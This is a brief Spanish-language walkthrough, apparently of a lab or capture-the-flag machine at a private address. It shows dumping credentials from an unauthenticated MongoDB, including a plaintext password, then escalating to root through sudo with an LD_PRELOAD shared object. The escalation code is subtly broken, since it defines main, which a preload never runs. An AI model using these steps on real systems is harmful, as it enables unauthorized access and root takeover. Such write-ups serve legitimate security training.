IP: 10.10.103.120

1. Explotación de MongoDB
bash
Copy
mongo 10.10.103.120:27017
show dbs
use admin
db.user.find()
Credenciales: webdeveloper:BahamasChapp123!@#

2. Escalada con LD_PRELOAD
bash
Copy
echo 'int main(){setuid(0);system("/bin/bash");}' > evil.c
gcc -shared -o evil.so evil.c -fPIC
sudo LD_PRELOAD=./evil.so /usr/bin/sky_backup_utility